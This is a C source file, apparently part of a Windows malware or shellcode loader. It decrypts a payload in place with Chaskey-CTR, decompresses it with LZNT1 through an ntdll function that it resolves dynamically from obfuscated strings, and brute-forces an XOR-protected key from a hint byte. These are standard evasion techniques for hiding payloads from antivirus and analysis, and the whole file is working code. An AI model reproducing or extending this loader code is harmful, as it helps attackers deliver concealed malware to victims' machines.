// =============================================
// Crypt.c - Chaskey-CTR Decryption
//           + LZNT1 Decompression (ntdll)
//           + Brute Force Key Recovery
// =============================================

#include "Common.h"

// -----------------------------------------------
// Chaskey-12 ARX permutation (128-bit block)
// Lightweight block cipher — no S-boxes, no lookup
// tables, no CRT dependencies. Pure ALU operations.
// -----------------------------------------------
#define ROTL32(x, n) (((x) << (n)) | ((x) >> (32 - (n))))

static void ChaskeyPermute(UINT32 v[4]) {
    for (int i = 0; i < 12; i++) {
        v[0] += v[1]; v[1] = ROTL32(v[1], 5);  v[1] ^= v[0]; v[0] = ROTL32(v[0], 16);
        v[2] += v[3]; v[3] = ROTL32(v[3], 8);  v[3] ^= v[2];
        v[0] += v[3]; v[3] = ROTL32(v[3], 13); v[3] ^= v[0];
        v[2] += v[1]; v[1] = ROTL32(v[1], 7);  v[1] ^= v[2]; v[2] = ROTL32(v[2], 16);
    }
}

// -----------------------------------------------
// Chaskey-CTR Decrypt/Encrypt payload in-place
//
// Counter block: nonce[0..2] XOR key[0..2] + (counter XOR key[3])
// Pre/post whitening with the key ensures diffusion.
// -----------------------------------------------
BOOL ChaskeyCtrDecrypt(
    IN PBYTE pData,
    IN DWORD dwSize,
    IN PBYTE pKey,
    IN PBYTE pNonce
) {
    if (!pData || !pKey || !pNonce || dwSize == 0)
        return FALSE;

    UINT32 key[4];
    MemCopy(key, pKey, 16);
    UINT32 nonce[3];
    MemCopy(nonce, pNonce, 12);

    DWORD dwBlocks = (dwSize + 15) / 16;

    for (DWORD blk = 0; blk < dwBlocks; blk++) {
        UINT32 ctr[4] = {
            nonce[0] ^ key[0],
            nonce[1] ^ key[1],
            nonce[2] ^ key[2],
            blk      ^ key[3]
        };

        ChaskeyPermute(ctr);

        // Post-whitening
        ctr[0] ^= key[0];
        ctr[1] ^= key[1];
        ctr[2] ^= key[2];
        ctr[3] ^= key[3];

        // XOR keystream with data
        DWORD dwOffset = blk * 16;
        DWORD dwChunk  = dwSize - dwOffset;
        if (dwChunk > 16) dwChunk = 16;

        PBYTE pKs = (PBYTE)ctr;
        for (DWORD i = 0; i < dwChunk; i++)
            pData[dwOffset + i] ^= pKs[i];
    }

    // Wipe key material from stack
    MemSet(key, 0, sizeof(key));
    MemSet(nonce, 0, sizeof(nonce));

    return TRUE;
}

// -----------------------------------------------
// LZNT1 Decompression via ntdll RtlDecompressBuffer
//
// Resolves the function dynamically from ntdll
// (already loaded). Zero additional DLL loads needed.
// -----------------------------------------------
#define COMPRESSION_FORMAT_LZNT1 0x0002

typedef NTSTATUS(NTAPI* fnRtlDecompressBuffer)(
    USHORT CompressionFormat,
    PUCHAR UncompressedBuffer,
    ULONG  UncompressedBufferSize,
    PUCHAR CompressedBuffer,
    ULONG  CompressedBufferSize,
    PULONG FinalUncompressedSize
);

BOOL DecompressPayload(
    IN  PAPI_HASHING pApi,
    IN  PBYTE        pCompressed,
    IN  DWORD        dwCompressedSize,
    OUT PBYTE*       ppDecompressed,
    IN  DWORD        dwOriginalSize
) {
    if (!pCompressed || !ppDecompressed || dwCompressedSize == 0 || dwOriginalSize == 0)
        return FALSE;

    BYTE xNtdll[] = XSTR_NTDLL_DLL;
    DEOBF(xNtdll);
    HMODULE hNtdll = pApi->pGetModuleHandleA((LPCSTR)xNtdll);
    if (!hNtdll)
        return FALSE;

    BYTE xDecomp[] = XSTR_RTL_DECOMPRESS_BUFFER;
    DEOBF(xDecomp);
    fnRtlDecompressBuffer pDecompress =
        (fnRtlDecompressBuffer)pApi->pGetProcAddress(hNtdll, (LPCSTR)xDecomp);
    if (!pDecompress)
        return FALSE;

    *ppDecompressed = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwOriginalSize);
    if (!*ppDecompressed)
        return FALSE;

    ULONG ulFinalSize = 0;
    NTSTATUS status = pDecompress(
        COMPRESSION_FORMAT_LZNT1,
        *ppDecompressed,
        dwOriginalSize,
        pCompressed,
        dwCompressedSize,
        &ulFinalSize
    );

    if (!NT_SUCCESS(status) || ulFinalSize != dwOriginalSize) {
        HeapFree(GetProcessHeap(), 0, *ppDecompressed);
        *ppDecompressed = NULL;
        return FALSE;
    }

    return TRUE;
}

// -----------------------------------------------
// Brute Force Key Recovery
// The real key is XOR-encrypted with an unknown byte 'b'
// Using HintByte (known first byte of key), we brute-force
// all 256 values of 'b' to find the correct one
// -----------------------------------------------
BOOL BruteForceDecryption(
    IN  BYTE    HintByte,
    IN  PBYTE   pProtectedKey,
    IN  SIZE_T  sKeySize,
    OUT PBYTE*  ppRealKey
) {
    if (!pProtectedKey || !ppRealKey || sKeySize == 0)
        return FALSE;

    BYTE b = 0;

    while (1) {
        if ((pProtectedKey[0] ^ b) == HintByte)
            break;

        if (b == 0xFF)
            return FALSE;

        b++;
    }

    *ppRealKey = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sKeySize);
    if (!*ppRealKey)
        return FALSE;

    for (SIZE_T i = 0; i < sKeySize; i++) {
        (*ppRealKey)[i] = (BYTE)((pProtectedKey[i] ^ b) - i);
    }

    return TRUE;
}
